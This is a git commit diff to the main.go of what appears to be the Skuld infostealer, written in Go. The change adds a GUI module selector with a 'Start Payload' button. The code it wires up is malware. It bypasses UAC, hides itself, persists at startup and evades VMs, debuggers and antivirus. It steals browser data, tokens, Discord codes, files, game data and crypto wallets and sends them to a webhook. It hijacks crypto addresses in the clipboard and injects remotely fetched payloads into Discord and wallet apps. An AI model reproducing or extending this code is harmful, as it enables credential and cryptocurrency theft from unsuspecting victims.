3e52ccbeccbba5aa2766c7acfb4aff24e21679c0
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-07-10 16:40:37 +0300

    update

--- main.go
+++ main.go
@@ -1,6 +1,11 @@
 package main
 
 import (
+	"fyne.io/fyne/v2"
+	"fyne.io/fyne/v2/app"
+	"fyne.io/fyne/v2/container"
+	"fyne.io/fyne/v2/widget"
+
 	"github.com/hackirby/skuld/modules/antidebug"
 	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
@@ -25,61 +30,91 @@ func main() {
 	CONFIG := map[string]interface{}{
 		"webhook": "",
 		"cryptos": map[string]string{
-			"BTC": "",
-			"BCH": "",
-			"ETH": "",
-			"XMR": "",
-			"LTC": "",
-			"XCH": "",
-			"XLM": "",
-			"TRX": "",
-			"ADA": "",
+			"BTC":  "",
+			"BCH":  "",
+			"ETH":  "",
+			"XMR":  "",
+			"LTC":  "",
+			"XCH":  "",
+			"XLM":  "",
+			"TRX":  "",
+			"ADA":  "",
 			"DASH": "",
 			"DOGE": "",
 		},
 	}
 
-	if program.IsAlreadyRunning() {
-		return
-	}
+	a := app.New()
+	w := a.NewWindow("Module Selector")
 
-	uacbypass.Run()
+	// Checkbox'ları tanımla
+	modAntivm := widget.NewCheck("AntiVM", nil)
+	modAntidebug := widget.NewCheck("AntiDebug", nil)
+	modAntivirus := widget.NewCheck("AntiVirus", nil)
+	modBrowsers := widget.NewCheck("Browsers", nil)
+	modTokens := widget.NewCheck("Tokens", nil)
+	modDiscodes := widget.NewCheck("Discodes", nil)
+	modClipper := widget.NewCheck("Clipper", nil)
+	modCommonfiles := widget.NewCheck("CommonFiles", nil)
+	modGames := widget.NewCheck("Games", nil)
+	modWallets := widget.NewCheck("Wallets", nil)
 
-	hideconsole.Run()
-	program.HideSelf()
+	runButton := widget.NewButton("Start Payload", func() {
+		go uacbypass.Run()
+		go hideconsole.Run()
+		program.HideSelf()
 
-	if !program.IsInStartupPath() {
 		go fakeerror.Run()
 		go startup.Run()
-	}
 
-	antivm.Run()
-	go antidebug.Run()
-	go antivirus.Run()
+		if modAntivm.Checked {
+			go antivm.Run()
+		}
+		if modAntidebug.Checked {
+			go antidebug.Run()
+		}
+		if modAntivirus.Checked {
+			go antivirus.Run()
+		}
+		if modBrowsers.Checked {
+			go browsers.Run(CONFIG["webhook"].(string))
+		}
+		if modTokens.Checked {
+			go tokens.Run(CONFIG["webhook"].(string))
+		}
+		if modDiscodes.Checked {
+			go discodes.Run(CONFIG["webhook"].(string))
+		}
+		if modClipper.Checked {
+			go clipper.Run(CONFIG["cryptos"].(map[string]string))
+		}
+		if modCommonfiles.Checked {
+			go commonfiles.Run(CONFIG["webhook"].(string))
+		}
+		if modGames.Checked {
+			go games.Run(CONFIG["webhook"].(string))
+		}
+		if modWallets.Checked {
+			go wallets.Run(CONFIG["webhook"].(string))
+		}
 
-	go discordinjection.Run(
-		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
-		CONFIG["webhook"].(string),
-	)
-	go walletsinjection.Run(
-		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
-		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		CONFIG["webhook"].(string),
-	)
+		go discordinjection.Run(
+			"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+			CONFIG["webhook"].(string),
+		)
+		go walletsinjection.Run(
+			"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
+			"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
+			CONFIG["webhook"].(string),
+		)
+	})
 
-	actions := []func(string){
-		system.Run,
-		browsers.Run,
-		tokens.Run,
-		discodes.Run,
-		commonfiles.Run,
-		wallets.Run,
-		games.Run,
-	}
+	w.SetContent(container.NewVBox(
+		modAntivm, modAntidebug, modAntivirus,
+		modBrowsers, modTokens, modDiscodes,
+		modClipper, modCommonfiles, modGames, modWallets,
+		runButton,
+	))
 
-	for _, action := range actions {
-		go action(CONFIG["webhook"].(string))
-	}
-
-	clipper.Run(CONFIG["cryptos"].(map[string]string))
+	w.ShowAndRun()
 }
